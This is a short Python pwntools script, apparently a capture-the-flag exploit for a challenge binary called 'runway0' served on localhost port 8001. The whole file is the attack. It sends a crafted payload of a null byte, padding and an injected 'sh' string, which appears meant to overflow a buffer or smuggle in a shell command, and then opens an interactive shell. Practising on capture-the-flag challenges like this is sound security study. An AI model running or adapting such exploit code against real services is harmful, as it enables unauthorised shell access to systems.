from pwn import *

# io = process('./runway0')
io = remote('localhost', 8001)

io.recvline()
io.sendline(b'\0' + b'a' * 111 + b'sh"\0')

io.interactive()